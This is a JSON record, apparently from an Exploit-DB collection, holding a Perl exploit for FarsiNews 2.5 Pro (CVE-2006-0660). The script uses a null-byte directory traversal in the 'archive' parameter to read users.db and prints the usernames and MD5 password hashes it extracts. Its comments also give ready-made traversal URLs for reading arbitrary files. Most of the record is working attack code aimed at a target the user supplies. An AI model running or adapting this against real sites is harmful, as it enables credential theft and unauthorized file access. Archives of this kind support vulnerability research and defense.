{
  "id": "1538",
  "title": "Farsinews 2.5 - Directory Traversal Arbitrary &#039;users.db&#039; Access",
  "cve": "CVE-2006-0660",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# FarsiNews 2.5pro Show User&Passowrd\r\n# Exploit by Hessam-x (www.hessamx.net)\r\n#\r\n#\r\n######################################################\r\n#  ___ ___                __                         #\r\n# /   |   \\_____    ____ |  | __ ___________________ #\r\n#/    ~    \\__  \\ _/ ___\\|  |/ // __ \\_  __ \\___   / #\r\n#\\    Y    // __ \\\\  \\___|    <\\  ___/|  | \\//    /  #\r\n# \\___|_  /(____  /\\___  >__|_ \\\\___  >__|  /_____ \\ #\r\n#       \\/      \\/     \\/     \\/    \\/            \\/ #\r\n#             Iran Hackerz Security Team             #\r\n#               WebSite: www.hackerz.ir              #\r\n#                                                    #\r\n######################################################\r\n# Description                                        #\r\n#                                                    #\r\n# Name    : FarsiNews [www.farsinewsteam.com]        #\r\n# version : 2.5Pro                                   #\r\n######################################################\r\n# in FarsiNews if you change the archive value :\r\n# http://localhost/index.php?archive=hamid\r\n# see :\r\n# Warning: file([PATH]/data/archives/hamid.news.arch.php):\r\n# failed to open stream: No such file or directory in [PATH]\\inc\\shows.inc.php on line 642\r\n# Warning: file([PATH]/data/archives/hamid.comments.arch.php):\r\n# failed to open stream: No such file or directory in [PATH]\\inc\\shows.inc.php on line 686\r\n# ...[and many other error]\r\n# it means that shows.inc.php  try to open  '/archives/hamid.news.arch.php'  (and also 'hamid.comments.arch.php')  to read it's data .\r\n# we can change the archive value to '/../users.db.php%00' to see all username and password .\r\n# Exploit :\r\n# http://localhost/index.php?archive=/../users.db.php%00\r\n# http://localhost/Farsi1/index.php?archive=/../[file-to-read]%00\r\n# F0und by hamid\r\nuse LWP::Simple;\r\n\r\nprint \"-------------------------------------------\\n\";\r\nprint \"=             Farsinews 2.5Pro            =\\n\";\r\nprint \"=       By Hessam-x  - www.hackerz.ir     =\\n\";\r\nprint \"-------------------------------------------\\n\\n\";\r\n\r\n\r\n       print \"Target(www.example.com)\\> \";\r\n       chomp($targ = <STDIN>);\r\n\r\n       print \"Path: (/fn25/)\\>\";\r\n       chomp($path=<STDIN>);\r\n\r\n$url = \"index.php?archive=/../users.db.php%00\";\r\n$page = get(\"http://\".$targ.$path.$url) || die \"[-] Unable to retrieve: $!\";\r\nprint \"[+] Connected to: $targ\\n\";\r\n\r\n$page =~ m/<img alt=\"(.*?)\" src=/ && print \"[+] Username:\\n $1\\n\";\r\n$page =~ m/style=\"border: none;\" align=\"right\" \\/>(.*?)<\\/font>/ && print \"[+] MD5 Password:\\n $1\\n\";\r\n\r\nprint \"[-] Unable to retrieve User ID\\n\" if(!$1);\r\n\r\n# milw0rm.com [2006-02-28]",
  "url": "https://www.exploit-db.com/exploits/1538"
}